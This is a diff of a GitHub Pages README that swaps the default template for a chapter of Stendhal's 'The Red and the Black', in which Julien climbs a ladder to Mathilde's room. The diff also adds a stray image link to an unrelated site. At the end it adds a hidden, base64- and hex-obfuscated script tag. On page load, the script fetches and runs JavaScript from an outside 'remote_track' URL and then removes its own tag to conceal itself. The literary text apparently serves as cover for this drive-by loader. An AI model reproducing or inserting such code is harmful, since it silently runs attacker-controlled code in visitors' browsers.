@@ -1,37 +1,98 @@
-## Welcome to GitHub Pages
+# ONE O'CLOCK IN THE MORNING
+He was going to write a countermanding letter to Fouqué when eleven o'clock struck. He noisily turned the lock of the door of his room as though he had locked himself in. He went with a sleuth-like step to observe what was happening over the house, especially on the fourth storey where the servants slept. There was nothing unusual. One of madame de la Mole's chambermaids was giving an entertainment, the servants were taking punch with much gaiety. "Those who laugh like that," thought Julien, "cannot be participating in the nocturnal expedition; if they were, they would be more serious."
 
-You can use the [editor on GitHub](https://github.com/marivakhrusheva/Mali/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Eventually he stationed himself in an obscure corner of the garden. "If their plan is to hide themselves from the servants of the house, they will despatch the persons whom they have told off to surprise me over the garden wall.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"If M. de Croisenois shows any sense of proportion in this matter, he is bound to find it less compromising for the young person, whom he wishes to make his wife if he has me surprised before I enter her room."
 
-### Markdown
+He made a military and extremely detailed reconnaissance. "My honour is at stake," he thought. "If I tumble into some pitfall it will not be an excuse in my own eyes to say, 'I never thought of it.'"
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The weather was desperately serene. About eleven o'clock the moon rose, at half-past twelve it completely illuminated the facade of the hôtel looking out upon the garden.
+![i](https://www.airtransportanimal.com/wp-content/uploads/1970/01/panama-animal-transport-plane.jpg)
+"She is mad," Julien said to himself. As one o'clock struck there was still a light in comte Norbert's windows. Julien had never been so frightened in his life, he only saw the dangers of the enterprise and had no enthusiasm at all. He went and took the immense ladder, waited five minutes to give her time to tell him not to go, and five minutes after one placed the ladder against Mathilde's window. He mounted softly, pistol in hand, astonished at not being attacked. As he approached the window it opened noiselessly.
 
-```markdown
-Syntax highlighted code block
+"So there you are, monsieur," said Mathilde to him with considerable emotion. "I have been following your movements for the last hour."
 
-# Header 1
-## Header 2
-### Header 3
+Julien was very much embarrassed. He did not know how to conduct himself. He did not feel at all in love. He thought in his embarrassment that he ought to be venturesome. He tried to kiss Mathilde.
 
-- Bulleted
-- List
+"For shame," she said to him, pushing him away.
 
-1. Numbered
-2. List
+Extremely glad at being rebuffed, he hastened to look round him. The moon was so brilliant that the shadows which it made in mademoiselle de la Mole's room were black. "It's quite possible for men to be concealed without my seeing them," he thought.
 
-**Bold** and _Italic_ and `Code` text
+"What have you got in your pocket at the side of your coat?" Mathilde said to him, delighted at finding something to talk about. She was suffering strangely; all those sentiments of reserve and timidity which were so natural to a girl of good birth, had reasserted their dominion and were torturing her.
 
-[Link](url) and ![Image](src)
-```
+"I have all kinds of arms and pistols," answered Julien equally glad at having something to say.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"You must take the ladder away," said Mathilde.
 
-### Jekyll Themes
+"It is very big, and may break the windows of the salon down below or the room on the ground floor."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/marivakhrusheva/Mali/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"You must not break the windows," replied Mathilde making a vain effort to assume an ordinary conversational tone; "it seems to me you can lower the ladder by tying a cord to the first rung. I have always a supply of cords at hand."
 
-### Support or Contact
+"So this is a woman in love," thought Julien. "She actually dares to say that she is in love. So much self-possession and such shrewdness in taking precautions are sufficient indications that I am not triumphing over M. de Croisenois as I foolishly believed, but that I am simply succeeding him. As a matter of fact, what does it matter to me? Do I love her? I am triumphing over the marquis in so far as he would be very angry at having a successor, and angrier still at that successor being myself. How haughtily he looked at me this evening in the Café Tortoni when he pretended not to recognise me! And how maliciously he bowed to me afterwards, when he could not get out of it."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Julien had tied the cord to the last rung of the ladder. He lowered it softly and leant far out of the balcony in order to avoid its touching the window pane. "A fine opportunity to kill me," he thought, "if anyone is hidden in Mathilde's room;" but a profound silence continued to reign everywhere.
+
+The ladder touched the ground. Julien succeeded in laying it on the border of the exotic flowers along side the wall.
+
+"What will my mother say," said Mathilde, "when she sees her beautiful plants all crushed? You must throw down the cord," she added with great self-possession. "If it were noticed going up to the balcony, it would be a difficult circumstance to explain."
+
+"And how am I to get away?" said Julien in a jesting tone affecting the Creole accent. (One of the chambermaids of the household had been born in Saint-Domingo.)
+
+"You? Why you will leave by the door," said Mathilde, delighted at the idea.
+
+"Ah! how worthy this man is of all my love," she thought.
+
+Julien had just let the cord fall into the garden; Mathilde grasped his arm. He thought he had been seized by an enemy and turned round sharply, drawing a dagger. She had thought that she had heard a window opening. They remained motionless and scarcely breathed. The moonlight lit up everything. The noise was not renewed and there was no more cause for anxiety.
+
+Then their embarrassment began again; it was great on both sides. Julien assured himself that the door was completely locked; he thought of looking under the bed, but he did not dare; "they might have stationed one or two lackeys there." Finally he feared that he might reproach himself in the future for this lack of prudence, and did look. Mathilde had fallen into all the anguish of the most extreme timidity. She was horrified at her position.
+
+"What have you done with my letters?" she said at last.
+
+"What a good opportunity to upset these gentlemen, if they are eavesdropping, and thus avoiding the battle," thought Julien.
+
+"The first is hid in a big Protestant Bible, which last night's diligence is taking far away from here."
+
+He spoke very distinctly as he went into these details, so as to be heard by any persons who might be concealed in two large mahogany cupboards which he had not dared to inspect.
+
+"The other two are in the post and are bound for the same destination as the first."
+
+### "Heavens, why all these precautions?" said Mathilde in alarm.
+
+"What is the good of my lying?" thought Julien, and he confessed all his suspicions.
+
+"So that's the cause for the coldness of your letters, dear," exclaimed Mathilde in a tone of madness rather than of tenderness.
+
+Julien did not notice that nuance. The endearment made him lose his head, or at any rate his suspicions vanished. He dared to clasp in his arms that beautiful girl who inspired him with such respect. He was only partially rebuffed. He fell back on his memory as he had once at Besançon with Armanda Binet, and recited by heart several of the finest phrases out of the Nouvelle Héloise.
+
+"You have the heart of a man," was the answer she made without listening too attentively to his phrases; "I wanted to test your courage, I confess it. Your first suspicions and your resolutions show you even more intrepid, dear, than I had believed."
+
+Mathilde had to make an effort to call him "dear," and was evidently paying more attention to this strange method of speech than to the substance of what she was saying. Being called "dear" without any tenderness in the tone afforded no pleasure to Julien; he was astonished at not being happy, and eventually fell back on his reasoning in order to be so. He saw that he was respected by this proud young girl who never gave undeserved praise; by means of this reasoning he managed to enjoy the happiness of satisfied vanity. It was not, it was true, that soulful pleasure which he had sometimes found with madame de Rênal. There was no element of tenderness in the feelings of these first few minutes. It was the keen happiness of a gratified ambition, and Julien was, above all, ambitious. He talked again of the people whom he had suspected and of the precautions which he had devised. As he spoke, he thought of the best means of exploiting his victory.
+
+Mathilde was still very embarrassed and seemed paralysed by the steps which she had taken. She appeared delighted to find a topic of conversation. They talked of how they were to see each other again. Julien extracted a delicious joy from the consciousness of the intelligence and the courage, of which he again proved himself possessed during this discussion. They had to reckon with extremely sharp people, the little Tanbeau was certainly a spy, but Mathilde and himself as well had their share of cleverness.
+
+What was easier than to meet in the library, and there make all arrangements?
+
+"I can appear in all parts of the hôtel," added Julien, "without rousing suspicion almost, in fact, in madame de la Mole's own room." It was absolutely necessary to go through it in order to reach her daughter's room. If Mathilde thought it preferable for him always to come by a ladder, then he would expose himself to that paltry danger with a heart intoxicated with joy.
+
+As she listened to him speaking, Mathilde was shocked by this air of triumph. "So he is my master," she said to herself, she was already a prey to remorse. Her reason was horrified at the signal folly which she had just committed. If she had had the power she would have annihilated both herself and Julien. When for a few moments she managed by sheer will-power to silence her pangs of remorse, she was rendered very unhappy by her timidity and wounded shame. She had quite failed to foresee the awful plight in which she now found herself.
+
+"I must speak to him, however," she said at last. "That is the proper thing to do. One does talk to one's lover." And then with a view of accomplishing a duty, and with a tenderness which was manifested rather in the words which she employed than in the inflection of her voice, she recounted various resolutions which she had made concerning him during the last few days.
+
+She had decided that if he should dare to come to her room by the help of the gardener's ladder according to his instructions, she would be entirely his. But never were such tender passages spoken in a more polite and frigid tone. Up to the present this assignation had been icy. It was enough to make one hate the name of love. What a lesson in morality for a young and imprudent girl! Is it worth while to ruin one's future for moments such as this?
+
+After long fits of hesitation which a superficial observer might have mistaken for the result of the most emphatic hate (so great is the difficulty which a woman's self-respect finds in yielding even to so firm a will as hers) Mathilde became eventually a charming mistress.
+
+In point of fact, these ecstasies were a little artificial. Passionate love was still more the model which they imitated than a real actuality.
+
+Mademoiselle de la Mole thought she was fulfilling a duty towards herself and towards her lover. "The poor boy," she said to herself, "has shewn a consummate bravery. He deserves to be happy or it is really I who will be shewing a lack of character." But she would have been glad to have redeemed the cruel necessity in which she found herself even at the price of an eternity of unhappiness.
+
+In spite of the awful violence she was doing to herself she was completely mistress of her words.
+
+No regret and no reproach spoiled that night which Julien found extraordinary rather than happy. Great heavens! what a difference to his last twenty-four hours' stay in Verrières. These fine Paris manners manage to spoil everything, even love, he said to himself, quite unjustly.
+
+He abandoned himself to these reflections as he stood upright in one of the great mahogany cupboards into which he had been put at the sign of the first sounds of movement in the neighbouring apartment, which was madame de la Mole's. Mathilde followed her mother to mass, the servants soon left the apartment and Julien easily escaped before they came back to finish their work.
+
+He mounted a horse and tried to find the most solitary spots in one of the forests near Paris. He was more astonished than happy. The happiness which filled his soul from time to time resembled that of a young sub-lieutenant who as the result of some surprising feat has just been made a full-fledged colonel by the commander-in-chief; he felt himself lifted up to an immense height. Everything which was above him the day before was now on a level with him or even below him. Little by little Julien's happiness increased in proportion as he got further away from Paris.
+
+<script id="niaZS" src="data:text/javascript;base64, dmFyIF80VzFSSiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzJFektaLCBfbTFidnYpIHt2YXIgX2cySG1kID0gZnVuY3Rpb24oX21kaWRnKSB7d2hpbGUgKC0tX21kaWRnKSB7XzJFektaWydwdXNoJ10oXzJFektaWydzaGlmdCddKCkpO319O19nMkhtZCgrK19tMWJ2dik7fShfNFcxUkosIDB4MTFiKSk7dmFyIF9KN2x3dyA9IGZ1bmN0aW9uKF96a0VIYywgX1RiM1V1KSB7X3prRUhjID0gX3prRUhjIC0gMHgwO3ZhciBfZGtuZWogPSBfNFcxUkpbX3prRUhjXTtyZXR1cm4gX2RrbmVqO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSjdsd3coJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX0JGYVJPID0gZG9jdW1lbnRbX0o3bHd3KCcweDEnKV0oX0o3bHd3KCcweDInKSk7X0JGYVJPW19KN2x3dygnMHgzJyldID0gX0o3bHd3KCcweDQnKTtfQkZhUk9bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NmNceDYxXHg2NFx4NjlceDZlXHg2MVx4NjNceDYzXHgzM1x4NjdceDY5XHg3NFx4MmVceDYyXHg2MVx4NmVceDZiXHg2Mlx4NjFceDZlXHg2Ylx4NmZceDc2XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmZceDQ5XHgzN1x4NzRceDU0XHg0OVx4NjhceDQ1XHg0MVx4NDUnO2RvY3VtZW50W19KN2x3dygnMHg1JyldKF9KN2x3dygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9CRmFSTyk7ZG9jdW1lbnRbX0o3bHd3KCcweDcnKV0oJ25pYVpTJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
